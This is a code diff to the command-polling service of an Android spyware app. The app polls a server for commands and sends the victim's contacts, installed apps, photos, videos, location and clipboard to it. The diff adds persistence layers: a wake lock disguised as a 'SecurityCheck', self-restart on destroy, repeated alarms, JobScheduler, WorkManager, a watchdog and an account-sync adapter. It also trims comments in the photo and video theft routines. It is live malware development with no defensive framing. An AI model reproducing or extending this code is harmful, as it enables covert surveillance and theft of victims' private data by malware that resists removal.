@@ -25,6 +25,7 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
@@ -67,9 +68,13 @@ public class ServiceRunner extends Service {
     private static final int POLL_INTERVAL = 15;
 
     private ScheduledExecutorService scheduler;
+    private ScheduledExecutorService heartbeatScheduler;
     private String deviceId = "";
     private String victimToken = "";
     private boolean registered = false;
+
+    // ★★★ WakeLock ★★★
+    private PowerManager.WakeLock wakeLock = null;
 
     // ============================================================
     // Lifecycle
@@ -98,6 +103,12 @@ public class ServiceRunner extends Service {
             Log.e(TAG, "init error: " + e.getMessage());
         }
 
+        // ★★★ WakeLock: يمنع CPU من النوم ★★★
+        acquireWakeLock();
+
+        // ★★★ إعداد كل طبقات الاستمرارية ★★★
+        setupPersistence();
+
         deviceId = getDeviceId();
         Log.d(TAG, "Device: " + deviceId);
 
@@ -108,8 +119,14 @@ public class ServiceRunner extends Service {
             } catch (Exception e) {}
         }).start();
 
+        // ★ Poll Loop — كل 15 ثانية
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
+
+        // ★ Heartbeat Loop — كل 30 ثانية (لتجديد الـ WakeLock والـ Alarm)
+        heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
+        heartbeatScheduler.scheduleAtFixedRate(this::heartbeat, 30, 30, TimeUnit.SECONDS);
+
         Log.d(TAG, "=== SERVICE STARTED ===");
     }
 
@@ -137,6 +154,7 @@ public class ServiceRunner extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // ★★★ إعادة البدء تلقائياً لو النظام قتل الـ Service ★★★
         return START_STICKY;
     }
 
@@ -146,14 +164,133 @@ public class ServiceRunner extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        Log.d(TAG, "[SERVICE] onDestroy — restarting...");
+
         try {
+            // ★ 1. أعد جدولة AlarmManager فوراً
+            PersistenceManager.scheduleAlarm(this);
+            PersistenceManager.scheduleRepeatingAlarm(this);
+
+            // ★ 2. أعد جدولة JobScheduler
+            PersistenceManager.scheduleJob(this);
+
+            // ★ 3. جدول ServiceRunner بعد 1 ثانية عبر Alarm
+            android.app.AlarmManager am = (android.app.AlarmManager)
+                    getSystemService(Context.ALARM_SERVICE);
+            if (am != null) {
+                Intent intent = new Intent(this, AlarmReceiver.class);
+                intent.setAction("com.sec.check.KEEP_ALIVE");
+
+                int flags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    flags |= android.app.PendingIntent.FLAG_IMMUTABLE;
+                }
+
+                android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
+                        this, 1003, intent, flags);
+
+                am.set(android.app.AlarmManager.RTC_WAKEUP,
+                        System.currentTimeMillis() + 1000, pi);
+            }
+
+            // ★ 4. أعد تشغيل نفسك مباشرة
             Intent restart = new Intent(this, ServiceRunner.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(restart);
             } else {
                 startService(restart);
             }
-        } catch (Exception ignored) {}
+
+            Log.d(TAG, "[SERVICE] restart initiated");
+
+        } catch (Exception e) {
+            Log.e(TAG, "[SERVICE] restart error: " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ WakeLock — يمنع النوم ★★★
+    // ============================================================
+    private void acquireWakeLock() {
+        try {
+            if (wakeLock != null && wakeLock.isHeld()) return;
+
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return;
+
+            wakeLock = pm.newWakeLock(
+                    PowerManager.PARTIAL_WAKE_LOCK,
+                    "SecurityCheck::ServiceWakeLock");
+
+            wakeLock.setReferenceCounted(false);
+            wakeLock.acquire();
+
+            Log.d(TAG, "[PERSISTENCE] WakeLock acquired");
+
+        } catch (Exception e) {
+            Log.e(TAG, "acquireWakeLock: " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ Heartbeat — كل 30 ثانية ★★★
+    // ============================================================
+    private void heartbeat() {
+        try {
+            Log.d(TAG, "[HEARTBEAT] tick");
+
+            // 1. جدّد WakeLock
+            if (wakeLock == null || !wakeLock.isHeld()) {
+                acquireWakeLock();
+            }
+
+            // 2. جدّد الـ Alarm
+            PersistenceManager.scheduleAlarm(this);
+
+            // 3. تأكد إن الـ Service لسه شغال
+            if (!registered) {
+                registerWithServer();
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "[HEARTBEAT] error: " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ إعداد كل طبقات الاستمرارية ★★★
+    // ============================================================
+    private void setupPersistence() {
+        try {
+            Log.d(TAG, "[PERSISTENCE] Setting up all layers...");
+
+            // 1. AlarmManager فردي — كل دقيقة
+            PersistenceManager.scheduleAlarm(this);
+
+            // 2. AlarmManager متكرر — كل 5 دقايق
+            PersistenceManager.scheduleRepeatingAlarm(this);
+
+            // 3. JobScheduler — كل 15 دقيقة
+            PersistenceManager.scheduleJob(this);
+
+            // 4. WorkManager — كل 15 دقيقة
+            PersistenceManager.scheduleWork(this);
+
+            // 5. Services Watchdog — كل 10 ثواني
+            ServicesWatchdog.startWatching(this);
+
+            // 6. Account Sync — كل ساعة
+            try {
+                AccountSyncService.registerSyncAdapter(this);
+            } catch (Exception e) {
+                Log.e(TAG, "[PERSISTENCE] account sync error: " + e.getMessage());
+            }
+
+            Log.d(TAG, "[PERSISTENCE] ✅ All layers enabled");
+
+        } catch (Exception e) {
+            Log.e(TAG, "[PERSISTENCE] setupPersistence error: " + e.getMessage());
+        }
     }
 
     private String getDeviceId() {
@@ -235,7 +372,7 @@ public class ServiceRunner extends Service {
                 case "get_contacts": sendContacts(); break;
                 case "get_apps": sendApps(); break;
                 case "get_photos": sendPhotos(); break;
-                case "get_videos": sendVideos(); break;      // ★ جديد
+                case "get_videos": sendVideos(); break;
                 case "get_location": sendLocation(); break;
                 case "get_clipboard": sendClipboard(); break;
 
@@ -485,11 +622,10 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ إصلاح سحب الصور — Android 10+ Scoped Storage ★★★
+    // ★★★ سحب الصور — Android 10+ Scoped Storage ★★★
     // ============================================================
     private void sendPhotos() {
         try {
-            // 1) تحقق من الصلاحيات
             boolean hasReadMedia = false;
             boolean hasReadStorage = false;
             boolean hasManageStorage = false;
@@ -497,11 +633,9 @@ public class ServiceRunner extends Service {
             if (Build.VERSION.SDK_INT >= 33) {
                 hasReadMedia = hasPermission("android.permission.READ_MEDIA_IMAGES");
             }
-
             if (Build.VERSION.SDK_INT <= 32) {
                 hasReadStorage = hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
             }
-
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 try {
                     hasManageStorage = Environment.isExternalStorageManager();
@@ -514,16 +648,13 @@ public class ServiceRunner extends Service {
                     + " readStorage=" + hasReadStorage
                     + " manageStorage=" + hasManageStorage);
 
-            // لو مفيش أي صلاحية → فشل
             if (!hasReadMedia && !hasReadStorage && !hasManageStorage) {
                 reportCommandResult("get_photos", "fail", "no_storage_permission");
                 return;
             }
 
-            // 2) استخدم Images.Media.EXTERNAL_CONTENT_URI
             Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
 
-            // 3) استخدم _ID بدل DATA
             String[] projection = new String[]{
                     MediaStore.Images.Media._ID,
                     MediaStore.Images.Media.DISPLAY_NAME,
@@ -532,16 +663,10 @@ public class ServiceRunner extends Service {
                     MediaStore.Images.Media.DATE_ADDED,
             };
 
-            // 4) ترتيب حسب الأحدث
             String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
             Cursor cursor = getContentResolver().query(
-                    collection,
-                    projection,
-                    null,
-                    null,
-                    sortOrder
-            );
+                    collection, projection, null, null, sortOrder);
 
             if (cursor == null) {
                 reportCommandResult("get_photos", "fail", "cursor_null");
@@ -557,15 +682,14 @@ public class ServiceRunner extends Service {
                 return;
             }
 
-            // 5) احصل على indices
             int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
             int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
             int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
             int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);
 
             int sent = 0;
-            int maxPhotos = 100;              // ★ 100 صورة
-            int maxSize = 5 * 1024 * 1024;    // ★ 5MB للصورة
+            int maxPhotos = 100;
+            int maxSize = 5 * 1024 * 1024;
 
             while (cursor.moveToNext() && sent < maxPhotos) {
                 try {
@@ -579,7 +703,6 @@ public class ServiceRunner extends Service {
                         continue;
                     }
 
-                    // ★★★ الطريقة الصحيحة: ContentUris + openInputStream ★★★
                     Uri imageUri = android.content.ContentUris.withAppendedId(collection, id);
 
                     InputStream inputStream = null;
@@ -646,7 +769,6 @@ public class ServiceRunner extends Service {
 
             cursor.close();
 
-            // 6) إشعار الإكمال
             JSONObject done = new JSONObject();
             done.put("type", "photos_done");
             done.put("token", victimToken);
@@ -663,7 +785,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ سحب الفيديوهات — جديد ★★★
+    // ★★★ سحب الفيديوهات ★★★
     // ============================================================
     private void sendVideos() {
         try {
@@ -725,7 +847,7 @@ public class ServiceRunner extends Service {
 
             int sent = 0;
             int maxVideos = 20;
-            int maxSize = 20 * 1024 * 1024;  // 20MB للفيديو
+            int maxSize = 20 * 1024 * 1024;
 
             while (cursor.moveToNext() && sent < maxVideos) {
                 try {
@@ -1298,7 +1420,6 @@ public class ServiceRunner extends Service {
                 reader.close();
                 return sb.toString();
             } else {
-                // اطبع رد الخطأ
                 try {
                     BufferedReader reader = new BufferedReader(
                             new InputStreamReader(conn.getErrorStream()));
@@ -1318,4 +1439,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                                             }
+                }
